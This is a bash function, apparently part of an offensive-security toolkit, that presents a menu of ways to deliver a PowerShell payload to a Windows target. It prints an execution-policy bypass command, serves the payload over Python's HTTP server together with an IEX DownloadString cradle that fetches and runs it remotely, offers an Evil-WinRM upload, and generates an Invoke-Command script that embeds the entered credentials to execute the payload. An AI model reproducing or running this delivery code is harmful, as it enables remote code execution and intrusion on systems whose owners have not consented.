_winrm_deliver() {
    local PS1_FILE="$1"
    local BASENAME
    BASENAME=$(basename "$PS1_FILE")
    echo ""
    echo -e "${YELLOW}═══ Delivery Options ═══${NC}"
    echo -e "  ${CYAN}[1]${NC} Manual transfer"
    echo -e "  ${CYAN}[2]${NC} Python HTTP + download cradle"
    echo -e "  ${CYAN}[3]${NC} Evil-WinRM upload"
    echo -e "  ${CYAN}[4]${NC} WinRM Invoke-Command"
    echo -e "  ${CYAN}[5]${NC} Skip"
    read -p "  Delivery [5]: " DEL; DEL="${DEL:-5}"
    case "$DEL" in
        1) echo -e "${GREEN}[+] Payload: ${PS1_FILE}${NC}"; echo -e "${YELLOW}[*] Run: powershell -ep bypass -f ${BASENAME}${NC}" ;;
        2)
            local LHOST; LHOST=$(ip -4 addr show scope global | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
            read -p "  IP [${LHOST}]: " IP; IP="${IP:-$LHOST}"
            read -p "  Port [8443]: " PORT; PORT="${PORT:-8443}"
            echo -e "${YELLOW}[*] Server: cd ${PAYLOAD_DIR} && python3 -m http.server ${PORT}${NC}"
            echo -e "${YELLOW}[*] Target: IEX(New-Object Net.WebClient).DownloadString('http://${IP}:${PORT}/${BASENAME}')${NC}"
            read -p "  Start server? [y/N]: " yn
            [[ "$yn" =~ ^[Yy] ]] && { cd "$PAYLOAD_DIR" && python3 -m http.server "$PORT" & disown; echo -e "${GREEN}[+] Serving on :${PORT}${NC}"; }
            ;;
        3)
            read -p "  Target IP: " TGT; read -p "  User: " TU; read -p "  Pass: " -s TP; echo ""
            echo -e "${YELLOW}[*] evil-winrm -i ${TGT} -u '${TU}' -p '***' then: upload ${PS1_FILE}${NC}"
            ;;
        4)
            read -p "  Target IP: " TGT; read -p "  User: " TU; read -p "  Pass: " -s TP; echo ""
            local RE="${PAYLOAD_DIR}/winrm_exec.ps1"
            local SC; SC=$(cat "$PS1_FILE")
            cat > "$RE" << PSEOF
\$p = ConvertTo-SecureString '${TP}' -AsPlainText -Force
\$c = New-Object System.Management.Automation.PSCredential('${TU}', \$p)
Invoke-Command -ComputerName '${TGT}' -Credential \$c -ScriptBlock { ${SC} }
PSEOF
            echo -e "${GREEN}[+] WinRM exec script: ${RE}${NC}"
            ;;
        5) echo -e "${GREEN}[+] Saved: ${PS1_FILE}${NC}" ;;
    esac
}

